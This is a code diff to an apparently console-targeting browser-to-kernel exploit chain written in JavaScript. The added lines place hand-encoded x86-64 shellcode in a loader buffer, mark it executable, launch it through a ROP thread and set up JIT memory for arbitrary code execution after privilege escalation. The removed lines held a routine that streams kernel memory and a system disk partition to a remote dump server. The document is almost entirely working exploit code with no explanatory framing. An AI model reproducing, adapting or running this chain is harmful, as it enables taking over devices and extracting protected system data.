@@ -786,7 +786,84 @@ function stage2() {
       alert(e);
     }
   } 
-    alert("after stage 3");
+    //alert("after stage 3");
+ var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
+    var payload_loader = p.malloc32(0x1000);
+
+    var loader_writer = payload_loader.backing;
+    loader_writer[0] = 0x56415741;
+    loader_writer[1] = 0x83485541;
+    loader_writer[2] = 0x894818EC;
+    loader_writer[3] = 0xC748243C;
+    loader_writer[4] = 0x10082444;
+    loader_writer[5] = 0x483C2302;
+    loader_writer[6] = 0x102444C7;
+    loader_writer[7] = 0x00000000;
+    loader_writer[8] = 0x000002BF;
+    loader_writer[9] = 0x0001BE00;
+    loader_writer[10] = 0xD2310000;
+    loader_writer[11] = 0x00009CE8;
+    loader_writer[12] = 0xC7894100;
+    loader_writer[13] = 0x8D48C789;
+    loader_writer[14] = 0xBA082474;
+    loader_writer[15] = 0x00000010;
+    loader_writer[16] = 0x000095E8;
+    loader_writer[17] = 0xFF894400;
+    loader_writer[18] = 0x000001BE;
+    loader_writer[19] = 0x0095E800;
+    loader_writer[20] = 0x89440000;
+    loader_writer[21] = 0x31F631FF;
+    loader_writer[22] = 0x0062E8D2;
+    loader_writer[23] = 0x89410000;
+    loader_writer[24] = 0x2C8B4CC6;
+    loader_writer[25] = 0x45C64124;
+    loader_writer[26] = 0x05EBC300;
+    loader_writer[27] = 0x01499848;
+    loader_writer[28] = 0xF78944C5;
+    loader_writer[29] = 0xBAEE894C;
+    loader_writer[30] = 0x00001000;
+    loader_writer[31] = 0x000025E8;
+    loader_writer[32] = 0x7FC08500;
+    loader_writer[33] = 0xFF8944E7;
+    loader_writer[34] = 0x000026E8;
+    loader_writer[35] = 0xF7894400;
+    loader_writer[36] = 0x00001EE8;
+    loader_writer[37] = 0x2414FF00;
+    loader_writer[38] = 0x18C48348;
+    loader_writer[39] = 0x5E415D41;
+    loader_writer[40] = 0x31485F41;
+    loader_writer[41] = 0xC748C3C0;
+    loader_writer[42] = 0x000003C0;
+    loader_writer[43] = 0xCA894900;
+    loader_writer[44] = 0x48C3050F;
+    loader_writer[45] = 0x0006C0C7;
+    loader_writer[46] = 0x89490000;
+    loader_writer[47] = 0xC3050FCA;
+    loader_writer[48] = 0x1EC0C748;
+    loader_writer[49] = 0x49000000;
+    loader_writer[50] = 0x050FCA89;
+    loader_writer[51] = 0xC0C748C3;
+    loader_writer[52] = 0x00000061;
+    loader_writer[53] = 0x0FCA8949;
+    loader_writer[54] = 0xC748C305;
+    loader_writer[55] = 0x000068C0;
+    loader_writer[56] = 0xCA894900;
+    loader_writer[57] = 0x48C3050F;
+    loader_writer[58] = 0x006AC0C7;
+    loader_writer[59] = 0x89490000;
+    loader_writer[60] = 0xC3050FCA;
+
+    chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
+
+    var loader_thr = chain.spawn_thread("loader_thr", function (new_thr) {
+      new_thr.push(window.gadgets["pop rdi"]);
+      new_thr.push(payload_buffer);
+      new_thr.push(payload_loader);
+      new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);
+    });
+    loader_thr();
+    alert("waiting for payload");
+  
 }
 
 function stage3() {
@@ -1470,103 +1547,31 @@ function stage3() {
   
 	let uid_is_set = chain.syscall(23, 0);
 	
-	alert("uid_is_set: 0x" + uid_is_set.low);
+	debug_log("uid_is_set: 0x" + uid_is_set.low);
 
-  //alert("prison3: " + kernel_read8(proc_ucred.add32(0x30)));
+    var exec_handle = chain.syscall(533, 0, 0x100000, 7);
+	var write_handle = chain.syscall(534, exec_handle, 3);
+	var write_address = chain.syscall(477, new int64(0x91000000, 0x9), 0x100000, 3, 17, write_handle, 0);
+	var exec_address = chain.syscall(477, new int64(0x90000000, 0x9), 0x100000, 0x5, 1, exec_handle, 0)
+	chain.syscall(324, 1);
+	if(exec_address.low != 0x90000000) {
+	  alert("[ERROR] failed to allocate jit memory REBOOT");
+	  while(1){};
+	}
+	
+	var exec_writer = p.array_from_address(write_address, 0x4000);
+	for(var i = 0; i < 0x200; i++) {
+		exec_writer[i] = 0x90909090;
+	}
+	exec_writer[0x200] = 0x37C0C748;
+	exec_writer[0x201] = 0xC3000013;
+	if(chain.call(exec_address).low != 0x1337) {
+		alert("[ERROR] hmm weird REBOOT");
+		while(1){};
+	}
 
-/*
-  let dump_addr = get_kaddr(0x50F3C00);
-  let dump_page = p.malloc(0x1000);
-
-  alert("about to dump kernel (0x" + dump_addr + "), ensure dump server is running (" + DUMP_NET_IP + ":5656)...");
-
-  let connect_res = chain.syscall(0x062, dump_sock_fd, dump_sock_addr_store, 0x10);
-  alert("connected dump sock? 0x" + connect_res);
-
-  for (let pfn = 0; ; pfn++) {
-    
-      copyout(dump_addr.add32((pfn * 0x1000)), dump_page, 0x1000);
-    
-
-    
-    let write_res = chain.syscall(0x004, dump_sock_fd, dump_page, 0x1000);
-    if (pfn == 0)
-      alert("first page written? 0x" + write_res);
-  }
-
-  // end dump code
-*/
-  const OFFSET_ERRNO = 0x911A8;
-  
-  let stupid_string = p.stringify("/dev/ssd0.system_ex");
-  
-  let buf = p.malloc(0x4000);
-  let fd = chain.syscall(0x005,stupid_string, 0, 0);//open O_RDONLY
-  if(fd.low == 0xffffffff){
-    alert("failed to open, error -1");
-	let errno = p.read8(libKernelBase.add32(OFFSET_ERRNO));
-	alert("errno: " + errno);
-  }
-  else{
-    alert("opened successfully, 0x" + fd);
-  }
-
-  let connect_res = chain.syscall(0x062, dump_sock_fd, dump_sock_addr_store, 0x10);//connect
-  alert("connected dump sock? 0x" + connect_res);
-  //814,78125 MiB
-  for (let pfn = 0; ; pfn++) {
-      let read = chain.syscall(0x003, fd, buf, 0x4000);//read
-    let write = chain.syscall(0x004, dump_sock_fd, buf, read);//write
-    
-  if(pfn == 0){  
-      
-    if(read.low == 0xffffffff){
-      alert("failed to read, error -1");
-	  break;
-    }
-    else{
-    alert("read successfully, 0x" + read);
-    }
-    
-    if(write.low == 0xffffffff){
-      alert("failed to write, error -1");
-	  break;
-    }
-    else{
-    alert("written successfully, 0x" + write);
-    }
-  }
-  }
-
-
-
-  // end dump code
-  
-/*
-  kernel_write8(proc_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF));
-
-  //find_execution_socket();
-  var exec_handle = chain.syscall(533, 0, 0x100000, 7);
-  var write_handle = chain.syscall(534, exec_handle, 3);
-  var write_address = chain.syscall(477, new int64(0x91000000, 0x9), 0x100000, 3, 17, write_handle, 0);
-  var exec_address = chain.syscall(477, new int64(0x90000000, 0x9), 0x100000, 0x5, 1, exec_handle, 0)
-  chain.syscall(324, 1);
-  if(exec_address.low != 0x90000000) {
-      alert("[ERROR] failed to allocate jit memory REBOOT");
-      while(1){};
-  }
-  var exec_writer = p.array_from_address(write_address, 0x4000);
-  for(var i = 0; i < 0x200; i++) {
-      exec_writer[i] = 0x90909090;
-  }
-  exec_writer[0x200] = 0x37C0C748;
-  exec_writer[0x201] = 0xC3000013;
-  if(chain.call(exec_address).low != 0x1337) {
-      alert("[ERROR] hmm weird REBOOT");
-      while(1){};
-  }
-
-  exec_writer[0] = 0x54415355;
+	/*
+	exec_writer[0] = 0x54415355;
   exec_writer[1] = 0x1111BB48;
   exec_writer[2] = 0x11111111;
   exec_writer[3] = 0xBD481111;
@@ -1665,15 +1670,17 @@ function stage3() {
   p.write8(write_address.add32(0x51), fix_these_sockets_ptr);
 
   p.write8(write_address.add32(0x7B), target_file.add32(FILE_FOPS_OFFSET));
-  //p.write8(write_address.add32(0x85), socketops);
+  p.write8(write_address.add32(0x85), socketops);
   p.write8(write_address.add32(0x92), kernel_base);
 
   p.write8(fake_socketops.add32(FILEOPS_IOCTL_OFFSET), exec_address);
   kernel_write8(target_file.add32(FILE_FOPS_OFFSET), fake_socketops);
   chain.syscall(54, target_socket, 0x20001111, 0);
-  alert("executed in kernel");
+	*/
+  
+  //alert("executed in kernel");
   //p.write8(0, 0);
-  */
+  
 }
 
 const stack_sz = 0x40000;
